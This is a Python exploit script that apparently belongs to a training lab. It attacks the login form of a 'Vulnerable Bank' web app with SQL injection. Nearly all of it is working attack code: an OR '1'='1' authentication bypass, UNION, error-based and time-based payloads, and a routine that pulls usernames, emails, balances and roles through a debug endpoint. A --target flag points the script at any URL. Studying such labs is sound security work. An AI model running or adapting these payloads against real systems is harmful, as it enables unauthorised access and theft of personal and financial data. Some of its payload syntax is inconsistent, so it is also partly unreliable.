#!/usr/bin/env python3
"""
SQL Injection Exploit - Vulnerable Bank
========================================
This script demonstrates SQL injection attacks on the login form.

CVSS Score: 9.8 (Critical)
CWE: CWE-89
"""

import requests
import sys

# Target configuration
TARGET_URL = "http://localhost:8080"
LOGIN_ENDPOINT = f"{TARGET_URL}/login"

def print_banner():
    print("=" * 60)
    print("SQL Injection Exploit - Vulnerable Bank")
    print("=" * 60)
    print()

def test_basic_bypass():
    """Test 1: Authentication Bypass using OR '1'='1'"""
    print("[*] Test 1: Basic Authentication Bypass")
    print("[*] Payload: admin' OR '1'='1' --")

    data = {
        'username': "admin' OR '1'='1' --",
        'password': "anything"
    }

    response = requests.post(LOGIN_ENDPOINT, data=data, allow_redirects=False)

    if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
        print("[+] SUCCESS! Authentication bypassed!")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Redirect Location: {response.headers.get('Location')}")

        # Check session cookie
        if 'session' in response.cookies:
            print(f"[+] Session Cookie: {response.cookies['session']}")

        return True
    else:
        print("[-] FAILED: Could not bypass authentication")
        return False

def test_union_injection():
    """Test 2: UNION-based SQL Injection"""
    print("\n[*] Test 2: UNION-based SQL Injection")
    print("[*] Payload: ' UNION SELECT 1,2,'admin','password',5,6,7,8,9,10,11,12 --")

    # This payload attempts to inject a union query to return fake admin credentials
    data = {
        'username': "' UNION SELECT 1,'injected_admin','injected_pass','fake@email.com','9999999999',10000.00,'admin','000-00-0000','+380501111111','Injected Address',NOW(),NOW(),TRUE --",
        'password': "injected_pass"
    }

    response = requests.post(LOGIN_ENDPOINT, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("[+] UNION injection potentially successful!")
        print(f"[+] Status Code: {response.status_code}")
    else:
        print("[-] UNION injection may need adjustment")

def test_error_based():
    """Test 3: Error-based SQL Injection"""
    print("\n[*] Test 3: Error-based SQL Injection")
    print("[*] Payload: admin' AND 1=CONVERT(int, (SELECT @@version)) --")

    data = {
        'username': "admin' AND 1=CONVERT(int, (SELECT database())) --",
        'password': "anything"
    }

    response = requests.post(LOGIN_ENDPOINT, data=data)

    if 'error' in response.text.lower() or 'exception' in response.text.lower():
        print("[+] Error message received - error-based injection possible!")
        print(f"[+] Response snippet: {response.text[:200]}")
    else:
        print("[-] No error message in response")

def test_time_based():
    """Test 4: Time-based Blind SQL Injection"""
    print("\n[*] Test 4: Time-based Blind SQL Injection")
    print("[*] Payload: admin' AND SLEEP(5) --")

    import time

    data = {
        'username': "admin' AND SLEEP(5) --",
        'password': "anything"
    }

    start_time = time.time()
    response = requests.post(LOGIN_ENDPOINT, data=data, timeout=10)
    elapsed_time = time.time() - start_time

    if elapsed_time >= 5:
        print(f"[+] Time-based injection successful! Delay: {elapsed_time:.2f}s")
    else:
        print(f"[-] No significant delay detected: {elapsed_time:.2f}s")

def extract_users():
    """Extract user data using SQL injection"""
    print("\n[*] Test 5: Data Extraction")
    print("[*] Extracting user list...")

    # Login with SQL injection first
    session = requests.Session()
    data = {
        'username': "admin' OR '1'='1' --",
        'password': "anything"
    }
    session.post(LOGIN_ENDPOINT, data=data)

    # Now use sql_debug endpoint to extract data
    debug_url = f"{TARGET_URL}/sql_debug?query=SELECT username,email,balance,role FROM users"

    response = session.get(debug_url)

    if response.status_code == 200:
        print("[+] Data extracted successfully!")
        try:
            data = response.json()
            print(f"[+] Found {len(data.get('results', []))} users:")
            for user in data.get('results', []):
                print(f"    - {user.get('username')} ({user.get('role')}) - Balance: ${user.get('balance')}")
        except:
            print("[!] Could not parse response")
    else:
        print("[-] Data extraction failed")

def main():
    print_banner()

    if len(sys.argv) > 1 and sys.argv[1] == '--target':
        global TARGET_URL, LOGIN_ENDPOINT
        TARGET_URL = sys.argv[2]
        LOGIN_ENDPOINT = f"{TARGET_URL}/login"

    print(f"[*] Target: {TARGET_URL}")
    print("[*] Starting SQL Injection tests...\n")

    # Run all tests
    test_basic_bypass()
    test_union_injection()
    test_error_based()
    test_time_based()
    extract_users()

    print("\n" + "=" * 60)
    print("[*] All tests completed!")
    print("=" * 60)
    print("\n[!] Remediation:")
    print("  1. Use parameterized queries (prepared statements)")
    print("  2. Input validation and sanitization")
    print("  3. Principle of least privilege for database users")
    print("  4. Implement WAF rules")
    print("  5. Regular security audits")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
